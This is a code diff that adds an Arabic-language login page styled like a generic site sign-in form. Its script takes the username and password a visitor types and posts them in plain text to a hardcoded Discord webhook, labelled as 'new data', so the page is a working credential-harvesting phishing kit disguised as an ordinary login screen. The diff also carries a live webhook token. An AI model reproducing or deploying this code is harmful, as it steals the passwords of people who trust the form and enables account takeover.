@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<style>
+body {margin:0;font-family:Arial;background:#0f1117;color:white;direction:rtl;text-align:center;}
+.navbar {background:#161b22;padding:15px 30px;display:flex;justify-content:space-between;align-items:center;}
+.navbar .buttons button {margin-left:10px;padding:8px 15px;border-radius:6px;border:1px solid #2f81f7;cursor:pointer;}
+.btn-outline {background:transparent;color:#2f81f7;}
+.btn-fill {background:#2f81f7;color:white;border:none;}
+.container {max-width:400px;margin:80px auto;padding:20px;background:#161b22;border-radius:12px;}
+h1 {margin-bottom:10px;}
+.subtitle {color:#8b949e;margin-bottom:30px;}
+.input-group {margin-bottom:20px;text-align:right;}
+input {width:100%;padding:12px;border-radius:8px;border:1px solid #30363d;background:#161b22;color:white;margin-top:8px;}
+input:focus {outline:none;border-color:#2f81f7;}
+.login-btn {width:100%;padding:14px;border-radius:8px;border:none;background:linear-gradient(90deg,#2f81f7,#1f6feb);color:white;font-size:16px;cursor:pointer;margin-top:15px;}
+.login-btn:hover {opacity:0.9;}
+.link {margin-top:20px;font-size:14px;color:#58a6ff;cursor:pointer;}
+</style>
+</head>
+<body>
+
+<div class="navbar">
+    <div>🌐 موقعي</div>
+    <div class="buttons">
+        <button class="btn-outline">تسجيل الدخول</button>
+        <button class="btn-fill">إنشاء حساب</button>
+    </div>
+</div>
+
+<div class="container">
+<h1>تسجيل الدخول</h1>
+<div class="subtitle">العودة إلى حسابك</div>
+
+<div class="input-group">
+<label>اسم المستخدم أو البريد الإلكتروني</label>
+<input type="text" id="username" placeholder="أدخل اسم المستخدم أو البريد">
+</div>
+
+<div class="input-group">
+<label>كلمة المرور</label>
+<input type="password" id="password" placeholder="أدخل كلمة المرور">
+</div>
+
+<button class="login-btn" onclick="sendToDiscord()">تسجيل الدخول</button>
+
+<div class="link">نسيت كلمة المرور أو اسم المستخدم؟</div>
+<div class="link">ليس لديك حساب؟ أنشئ حساباً</div>
+</div>
+
+<script>
+function sendToDiscord() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    const webhookURL = "https://discord.com/api/webhooks/1474029320698859666/Uy1CJ3_dyjoFJnl2TLmnlWk0dkI6ZUUX2fsBxY_qA6GQVnDM1jtTfKSNy4aPsbGXFLQo";
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({content: `**بيانات جديدة:**\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`})
+    })
+    .then(() => alert("تم الإرسال 🚀"))
+    .catch(() => alert("قد لا يعمل بسبب CORS ❌"));
+}
+</script>
+
+</body>
+</html>
